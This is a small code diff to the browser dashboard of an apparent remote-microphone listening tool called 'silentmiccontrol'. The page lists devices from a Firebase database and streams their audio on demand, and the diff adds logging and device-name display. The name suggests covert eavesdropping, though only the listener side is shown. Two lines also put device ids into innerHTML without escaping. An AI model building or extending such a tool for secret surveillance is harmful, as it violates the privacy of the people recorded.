@@ -1,4 +1,4 @@
-// Firebase setup
+<script>
 const firebaseConfig = {
   databaseURL: "https://silentmiccontrol-default-rtdb.firebaseio.com"
 };
@@ -9,24 +9,25 @@ const deviceListDiv = document.getElementById("deviceList");
 const audioElement = document.getElementById("remoteAudio");
 const statusDiv = document.getElementById("connectedStatus");
 
-// Load list of devices
 db.ref("devices").once("value").then(snapshot => {
   const devices = snapshot.val();
   deviceListDiv.innerHTML = "";
 
   if (!devices) {
     deviceListDiv.textContent = "No devices online.";
+    console.warn("No devices found in Firebase");
     return;
   }
 
-  Object.keys(devices).forEach(deviceId => {
-    const deviceInfo = devices[deviceId].info || {};
+  Object.entries(devices).forEach(([deviceId, deviceData]) => {
+    console.log("Device found:", deviceId, deviceData);
+    const deviceName = deviceData?.info?.name || deviceId;
 
     const deviceCard = document.createElement("div");
     deviceCard.className = "device";
 
     const label = document.createElement("span");
-    label.textContent = `Device: ${deviceId}`;
+    label.textContent = `Device: ${deviceName}`;
 
     const button = document.createElement("button");
     button.textContent = "▶️ Listen";
@@ -38,7 +39,6 @@ db.ref("devices").once("value").then(snapshot => {
   });
 });
 
-// Handle listening
 function listenToDevice(deviceId) {
   deviceListDiv.innerHTML = `<b>Connecting to ${deviceId}...</b>`;
   statusDiv.textContent = "";
@@ -85,3 +85,4 @@ function listenToDevice(deviceId) {
     statusDiv.innerHTML = `❌ Error connecting to <b>${deviceId}</b>`;
   });
 }
+</script>
